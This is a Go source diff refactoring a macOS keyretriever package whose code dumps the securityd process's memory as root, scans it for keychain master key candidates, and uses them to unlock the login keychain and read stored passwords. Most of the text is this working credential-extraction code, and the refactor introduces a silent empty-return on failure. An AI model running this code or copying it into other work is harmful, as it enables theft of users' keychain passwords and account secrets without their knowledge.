@@ -8,7 +8,6 @@ package keyretriever
 
 import (
 	"debug/macho"
-	"encoding/base64"
 	"encoding/binary"
 	"errors"
 	"fmt"
@@ -21,151 +20,49 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/unix"
+
+	"github.com/moond4rk/keychainbreaker"
 )
 
 var (
 	homeDir, _        = os.UserHomeDir()
-	loginKeychainPath = homeDir + "/Library/Keychains/login.keychain-db"
+	LoginKeychainPath = homeDir + "/Library/Keychains/login.keychain-db"
 )
 
-// DecryptKeychain extracts a keychain secret by dumping the securityd process memory.
-// Requires root privileges.
-func DecryptKeychain(storageName string) (string, error) {
-	if os.Geteuid() != 0 {
-		return "", errors.New("requires root privileges")
+func GetMacOSVersion() string {
+	v, err := unix.Sysctl("kern.osproductversion")
+	if err == nil {
+		return v
 	}
-
-	pid, err := findSecuritydPID()
-	if err != nil {
-		return "", err
-	}
-
-	corePath, err := dumpSecuritydMemory(pid)
-	if err != nil {
-		return "", err
-	}
-	defer os.Remove(corePath)
-
-	candidates, err := scanMasterKeyCandidates(pid, corePath)
-	if err != nil {
-		return "", err
-	}
-
-	return matchKeychainSecret(candidates, storageName)
+	return ""
 }
 
-// findSecuritydPID locates the root-owned securityd process.
-func findSecuritydPID() (int, error) {
+func FindProcessByName(name string, forceRoot bool) (int, error) {
 	buf, err := unix.SysctlRaw("kern.proc.all")
 	if err != nil {
-		return 0, fmt.Errorf("sysctl kern.proc.all: %w", err)
+		return 0, fmt.Errorf("sysctl kern.proc.all failed: %w", err)
 	}
 
 	kinfoSize := int(unsafe.Sizeof(unix.KinfoProc{}))
 	if len(buf)%kinfoSize != 0 {
-		return 0, fmt.Errorf("sysctl kern.proc.all: invalid data length")
+		return 0, fmt.Errorf("sysctl kern.proc.all returned invalid data length")
 	}
 
 	count := len(buf) / kinfoSize
 	for i := 0; i < count; i++ {
 		proc := (*unix.KinfoProc)(unsafe.Pointer(&buf[i*kinfoSize]))
-		name := byteSliceToString(proc.Proc.P_comm[:])
-		if name == "securityd" && proc.Eproc.Pcred.P_ruid == 0 {
-			return int(proc.Proc.P_pid), nil
+		// P_comm is [16]byte on Darwin (in newer x/sys/unix versions)
+		pname := byteSliceToString(proc.Proc.P_comm[:])
+		if pname == name {
+			// Note: P_ppid is in Eproc on some versions, but usually in ExternProc.
+			// In golang.org/x/sys/unix for Darwin, ExternProc has P_ppid.
+			// If P_ppid is missing, we can rely on P_ruid.
+			if !forceRoot || proc.Eproc.Pcred.P_ruid == 0 {
+				return int(proc.Proc.P_pid), nil
+			}
 		}
 	}
 	return 0, fmt.Errorf("securityd process not found")
-}
-
-// dumpSecuritydMemory creates a core dump of the securityd process.
-func dumpSecuritydMemory(pid int) (string, error) {
-	corePath := filepath.Join(os.TempDir(), fmt.Sprintf("securityd-core-%d", time.Now().UnixNano()))
-	cmd := exec.Command("gcore", "-d", "-s", "-v", "-o", corePath, strconv.Itoa(pid))
-	if err := cmd.Run(); err != nil {
-		return "", fmt.Errorf("gcore dump failed: %w", err)
-	}
-	return corePath, nil
-}
-
-// scanMasterKeyCandidates scans the core dump for potential master key patterns.
-func scanMasterKeyCandidates(pid int, corePath string) ([]string, error) {
-	regions, err := findMallocSmallRegions(pid)
-	if err != nil {
-		return nil, fmt.Errorf("find malloc regions: %w", err)
-	}
-
-	cmf, err := macho.Open(corePath)
-	if err != nil {
-		return nil, fmt.Errorf("open core dump: %w", err)
-	}
-	defer cmf.Close()
-
-	var candidates []string
-	seen := make(map[string]struct{})
-
-	for _, region := range regions {
-		data, vaddr, err := getMallocSmallRegionData(cmf, region)
-		if err != nil {
-			continue
-		}
-		found := scanRegionForKeys(data, vaddr, region)
-		for _, key := range found {
-			if _, ok := seen[key]; !ok {
-				candidates = append(candidates, key)
-				seen[key] = struct{}{}
-			}
-		}
-	}
-	return candidates, nil
-}
-
-// scanRegionForKeys searches a memory region for the 0x18 pattern followed by a pointer.
-func scanRegionForKeys(data []byte, vaddr uint64, region addressRange) []string {
-	var keys []string
-	for i := 0; i < len(data)-16; i += 8 {
-		val := binary.LittleEndian.Uint64(data[i : i+8])
-		if val != 0x18 {
-			continue
-		}
-		ptr := binary.LittleEndian.Uint64(data[i+8 : i+16])
-		if ptr < region.start || ptr > region.end {
-			continue
-		}
-		offset := ptr - vaddr
-		if offset+0x18 > uint64(len(data)) {
-			continue
-		}
-		masterKey := make([]byte, 0x18)
-		copy(masterKey, data[offset:offset+0x18])
-		keys = append(keys, fmt.Sprintf("%x", masterKey))
-	}
-	return keys
-}
-
-// matchKeychainSecret tries each candidate key against the keychain to find the target secret.
-func matchKeychainSecret(candidates []string, storageName string) (string, error) {
-	for _, candidate := range candidates {
-		kc, err := New(loginKeychainPath, candidate)
-		if err != nil {
-			continue
-		}
-		records, err := kc.DumpGenericPasswords()
-		if err != nil {
-			continue
-		}
-		for _, rec := range records {
-			if rec.Account == storageName {
-				if rec.PasswordBase64 {
-					decoded, err := base64.StdEncoding.DecodeString(rec.Password)
-					if err == nil {
-						return string(decoded), nil
-					}
-				}
-				return rec.Password, nil
-			}
-		}
-	}
-	return "", fmt.Errorf("secret %q not found in keychain", storageName)
 }
 
 type addressRange struct {
@@ -173,51 +70,144 @@ type addressRange struct {
 	end   uint64
 }
 
-func findMallocSmallRegions(pid int) ([]addressRange, error) {
-	output, err := exec.Command("vmmap", "--wide", strconv.Itoa(pid)).Output()
+func DecryptKeychain(storagename string) (string, error) {
+	if os.Geteuid() != 0 {
+		return "", errors.New("requires root privileges")
+	}
+
+	// find securityd PID
+	pid, err := FindProcessByName("securityd", true)
 	if err != nil {
-		return nil, fmt.Errorf("vmmap: %w", err)
+		return "", fmt.Errorf("failed to find securityd pid: %w", err)
+	}
+
+	corePath := filepath.Join(os.TempDir(), fmt.Sprintf("securityd-core-%d", time.Now().UnixNano()))
+	defer os.Remove(corePath)
+
+	// dump securityd memory:
+	// gcore -d -s -v -o core_path PID
+	cmd := exec.Command("gcore", "-d", "-s", "-v", "-o", corePath, strconv.Itoa(pid))
+	if err := cmd.Run(); err != nil {
+		return "", fmt.Errorf("failed to dump securityd memory: %w", err)
+	}
+
+	// find MALLOC_SMALL regions
+	regions, err := findMallocSmallRegions(pid)
+	if err != nil {
+		return "", fmt.Errorf("failed to find malloc small regions: %w", err)
+	}
+
+	// open core dump
+	cmf, err := macho.Open(corePath)
+	if err != nil {
+		return "", fmt.Errorf("failed to open core dump: %w", err)
+	}
+	defer cmf.Close()
+
+	// scan regions
+	var candidates []string
+	seen := make(map[string]struct{})
+	for _, region := range regions {
+		// read region data
+		data, vaddr, err := getMallocSmallRegionData(cmf, region)
+		if err != nil {
+			// Region might not be in core dump or other error, skip
+			continue
+		}
+		// Search for pattern
+		// 0x18 (8 bytes) followed by pointer (8 bytes)
+		for i := 0; i < len(data)-16; i += 8 {
+			val := binary.LittleEndian.Uint64(data[i : i+8])
+			if val == 0x18 {
+				ptr := binary.LittleEndian.Uint64(data[i+8 : i+16])
+				if ptr >= region.start && ptr <= region.end {
+					offset := ptr - vaddr
+					if offset+0x18 <= uint64(len(data)) {
+						masterKey := make([]byte, 0x18)
+						copy(masterKey, data[offset:offset+0x18])
+
+						keyStr := fmt.Sprintf("%x", masterKey)
+						if _, found := seen[keyStr]; !found {
+							candidates = append(candidates, keyStr)
+							seen[keyStr] = struct{}{}
+							// debug:("Found master key candidate: %s @ 0x%x", keyStr, ptr)
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// fuzz master key candidates
+	for _, candidate := range candidates {
+		kc, err := keychainbreaker.Open(keychainbreaker.WithFile(LoginKeychainPath))
+		if err != nil {
+			continue
+		}
+		if err := kc.Unlock(keychainbreaker.WithKey(candidate)); err != nil {
+			continue
+		}
+
+		records, err := kc.GenericPasswords()
+		if err != nil {
+			continue
+		}
+		for _, rec := range records {
+			if rec.Account == storagename {
+				return string(rec.Password), nil
+			}
+		}
+	}
+
+	return "", nil
+}
+
+func findMallocSmallRegions(pid int) ([]addressRange, error) {
+	cmd := exec.Command("vmmap", "--wide", strconv.Itoa(pid))
+	output, err := cmd.Output()
+	if err != nil {
+		return nil, err
 	}
 
 	var regions []addressRange
-	for _, line := range strings.Split(string(output), "\n") {
+	lines := strings.Split(string(output), "\n")
+	for _, line := range lines {
 		line = strings.TrimSpace(line)
-		if !strings.HasPrefix(line, "MALLOC_SMALL") {
-			continue
+		if strings.HasPrefix(line, "MALLOC_SMALL") {
+			parts := strings.Fields(line)
+			if len(parts) < 2 {
+				continue
+			}
+			rangeStr := parts[1]
+			rangeParts := strings.Split(rangeStr, "-")
+			if len(rangeParts) != 2 {
+				continue
+			}
+			start, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[0], "0x"), 16, 64)
+			if err != nil {
+				continue
+			}
+			end, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[1], "0x"), 16, 64)
+			if err != nil {
+				continue
+			}
+			regions = append(regions, addressRange{start: start, end: end})
 		}
-		parts := strings.Fields(line)
-		if len(parts) < 2 {
-			continue
-		}
-		rangeParts := strings.Split(parts[1], "-")
-		if len(rangeParts) != 2 {
-			continue
-		}
-		start, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[0], "0x"), 16, 64)
-		if err != nil {
-			continue
-		}
-		end, err := strconv.ParseUint(strings.TrimPrefix(rangeParts[1], "0x"), 16, 64)
-		if err != nil {
-			continue
-		}
-		regions = append(regions, addressRange{start: start, end: end})
 	}
 	return regions, nil
 }
 
 func getMallocSmallRegionData(f *macho.File, region addressRange) ([]byte, uint64, error) {
 	for _, seg := range f.Loads {
-		s, ok := seg.(*macho.Segment)
-		if !ok {
-			continue
-		}
-		if s.Addr == region.start && s.Addr+s.Memsz == region.end {
-			data := make([]byte, s.Filesz)
-			if _, err := s.ReadAt(data, 0); err != nil {
-				return nil, 0, err
+		if s, ok := seg.(*macho.Segment); ok {
+			if s.Addr == region.start && s.Addr+s.Memsz == region.end {
+				data := make([]byte, s.Filesz)
+				_, err := s.ReadAt(data, 0)
+				if err != nil {
+					return nil, 0, err
+				}
+				return data, s.Addr, nil
 			}
-			return data, s.Addr, nil
 		}
 	}
 	return nil, 0, fmt.Errorf("region not found in core dump")
